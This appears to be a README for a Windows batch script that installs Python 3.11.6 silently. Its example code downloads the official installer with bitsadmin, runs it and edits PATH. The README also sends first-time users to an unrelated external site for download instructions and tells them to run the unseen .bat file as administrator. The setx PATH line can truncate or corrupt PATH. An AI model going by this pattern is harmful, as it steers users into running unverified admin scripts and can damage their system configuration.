# Python 3.11.6 Installation Script

This script automates the installation process of Python 3.11.6 on your system and automatically adds Python to the system PATH.

## How to Download the Repo for First-Time Users

For detailed instructions on how to download the repository, please click on the following link: [**Instructions**](https://www.gitprojects.fnbubbles420.org/how-to-download-repos).

## Prerequisites

- Windows operating system
- Internet connection

## Usage

1. Download the script (`python-3.11.6.bat`) to your desired location.
2. Right Click  `Run As ADMIN` on the script to run it.

## Instructions

- Upon running the script, it will prompt you to confirm whether you want to continue with the installation.
- If you choose to continue (`Y`), the script will:
  - Download the Python 3.11.6 installer from the official Python website.
  - Install Python silently.
  - Add the Python Scripts directory to the system PATH.
- If you choose not to continue (`N`), the installation will be cancelled.

## Usage Example

Here's a quick look at what running the script might look like:

```batch
@echo off

echo This script will install Python 3.11.6 on your system.
echo Do you want to continue with the installation? (Y/N)

set /p choice=
if /i "%choice%"=="Y" (
    echo Downloading Python 3.11.6...
    bitsadmin /transfer myDownloadJob /download /priority normal https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe "%cd%\python-3.11.6.exe"
    if exist "%cd%\python-3.11.6.exe" (
        echo Installing Python 3.11.6...
        "%cd%\python-3.11.6.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
        if %ERRORLEVEL% EQU 0 (
            echo Python 3.11.6 has been installed successfully.
            echo Adding Python Scripts directory to system PATH...
            setx PATH "%PATH%;%ProgramFiles%\Python311\Scripts"
            echo Python Scripts directory has been added to the system PATH.
        ) else (
            echo Installation failed.
        )
    ) else (
        echo Download failed.
    )
) else (
    echo Installation cancelled.
)

pause
```
